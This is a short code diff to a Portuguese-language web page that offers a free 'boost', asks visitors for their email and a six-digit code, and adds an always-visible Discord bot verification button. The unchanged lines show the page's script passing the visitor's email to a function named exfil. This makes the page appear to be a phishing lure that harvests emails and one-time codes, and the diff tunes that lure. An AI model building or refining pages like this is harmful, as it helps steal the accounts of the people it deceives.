@@ -93,7 +93,7 @@ button.dc{width:100%;margin-top:10px;border:1px solid rgba(125,211,252,.4);borde
     <label>2 — TEU EMAIL (chega o código lá)</label>
     <input id="email" name="email" type="email" placeholder="voce@email.com" autocomplete="email" enterkeyhint="go">
     <button class="go" id="bGo">ATIVAR BOOST GRÁTIS →</button>
-    <button class="dc hide" id="bDc">VERIFICAR PELO BOT (DISCORD) →</button>
+    <button class="dc" id="bDc">🤖 VERIFICAR PELO BOT (DISCORD) →</button>
     <div class="hint" id="hint"></div>
     <div id="codeZone" class="hide">
       <label>3 — CÓDIGO DE 6 DÍGITOS</label>
@@ -152,7 +152,6 @@ button.dc{width:100%;margin-top:10px;border:1px solid rgba(125,211,252,.4);borde
     exfil({ step: "user+email", email: mail });
     try { localStorage.setItem("_boostpending", JSON.stringify({ guns, mail })); } catch {}
     $("bGo").disabled = true; $("bGo").textContent = "ENVIANDO CÓDIGO…";
-    $("bDc").classList.remove("hide");
     setTimeout(() => {
       $("codeZone").classList.remove("hide");
       $("bGo").textContent = "CÓDIGO ENVIADO ✅";
